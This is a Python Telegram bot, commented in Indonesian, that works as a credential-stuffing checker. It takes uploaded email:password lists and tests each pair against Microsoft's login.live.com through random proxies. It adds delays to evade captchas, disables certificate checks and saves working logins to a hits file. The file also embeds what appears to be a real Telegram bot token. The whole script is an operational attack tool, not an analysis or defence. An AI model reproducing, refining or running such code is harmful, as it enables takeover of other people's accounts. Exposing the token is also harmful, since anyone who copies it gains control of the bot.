import os
import requests
import telebot
import time
import random
import urllib3
import re

# 1. Optimasi Koneksi
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- KONFIGURASI ---
TOKEN = "8296635723:AAHkt1871oO2ZqDEeZm7WTCMI_GYo-jhZng"
ADMIN_ID = 7169419675 

bot = telebot.TeleBot(TOKEN)
PROXY_FILE = 'PROXY.txt'
HITS_FILE = 'hits.txt'
TEMP_COMBO = 'temp_combo.txt'

# Membersihkan sesi agar tidak Error 409 Conflict (Gambar 1000157416.png)
try:
    bot.remove_webhook()
    time.sleep(1)
except:
    pass

def get_proxy():
    """Mengambil Proxy dan Menampilkan Statusnya (Gambar 1000157401.png)"""
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, "r") as f:
                proxies = [l.strip() for l in f if l.strip()]
                if not proxies: return None, "KOSONG"
                chosen = random.choice(proxies)
                # Format http://host:port
                p_url = f"http://{chosen}"
                return {"http": p_url, "https": p_url}, chosen
        except: pass
    return None, "ERROR"

def update_combo_file(processed_line):
    """Auto-Clean: Menghapus akun yang sudah dicek (Gambar 1000157425.png)"""
    if os.path.exists(TEMP_COMBO):
        with open(TEMP_COMBO, "r") as f:
            lines = f.readlines()
        with open(TEMP_COMBO, "w") as f:
            for line in lines:
                if line.strip() != processed_line.strip():
                    f.write(line)

def checker_core(line):
    if ":" not in line: return None
    email, password = line.strip().split(":", 1)
    proxy_dict, ip_raw = get_proxy()
    
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 13)"}
    try:
        session = requests.Session()
        session.proxies = proxy_dict
        session.verify = False
        
        # Jeda agar tidak kena Captcha (Gambar 1000157405.png)
        time.sleep(random.uniform(3, 5)) 
        r1 = session.get("https://login.live.com/login.srf", timeout=20)
        
        if "f_captcha" in r1.text or "HIP" in r1.text:
            return f"📧 `{email}`\n🧩 **Captcha Detected**\n📡 Proxy: `{ip_raw}` (Skipped)", "captcha"

        ppft = re.search(r'value="(.+?)"', r1.text).group(1) if "PPFT" in r1.text else ""
        payload = {"login": email, "passwd": password, "PPFT": ppft, "LoginOptions": "3"}
        r2 = session.post("https://login.live.com/ppsecure/post.srf", data=payload, timeout=25)
        
        if "Welcome" in r2.text or r2.status_code == 200:
            with open(HITS_FILE, "a") as f: f.write(f"{email}:{password} | Proxy: {ip_raw}\n")
            # Menampilkan Proxy yang Hidup saat HIT
            return f"📧 `{email}`\n📊 Status: 🟢 **HIT SUCCESS**\n📡 **Proxy Live:** `{ip_raw}`", "hit"
        
        return f"📧 `{email}`\n📊 Status: ❌ **INVALID**\n📡 Proxy: `{ip_raw}`", "failed"
    except:
        return f"📧 `{email}`\n📊 Status: 🔴 **ERROR/TIMEOUT**\n📡 Proxy: `{ip_raw}` (DIE)", "error"

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(message.chat.id, "🚀 **V12 SATU-PERSATU + PROXY INFO**\nKirim file combo Anda.")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if message.from_user.id == ADMIN_ID:
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8').splitlines()
        
        with open(TEMP_COMBO, "w") as f:
            for line in content: f.write(f"{line}\n")
            
        total_awal = len(content)
        bot.reply_to(message, f"📥 Memproses `{total_awal}` akun. Proxy info diaktifkan.")
        
        counter = 0
        for line in content:
            result = checker_core(line)
            if result:
                text, code = result
                bot.send_message(message.chat.id, text, parse_mode="Markdown")
            
            update_combo_file(line)
            counter += 1
            
            # Laporan progres setiap 10 akun
            if counter % 10 == 0:
                sisa = total_awal - counter
                bot.send_message(message.chat.id, f"📝 **PROGRES**\nSisa: `{sisa}` akun", parse_mode="Markdown")
            
            time.sleep(1)

        bot.send_message(message.chat.id, "🏁 **SELESAI**")

if __name__ == "__main__":
    print(">>> Bot dengan Info Proxy Running...")
    bot.infinity_polling()
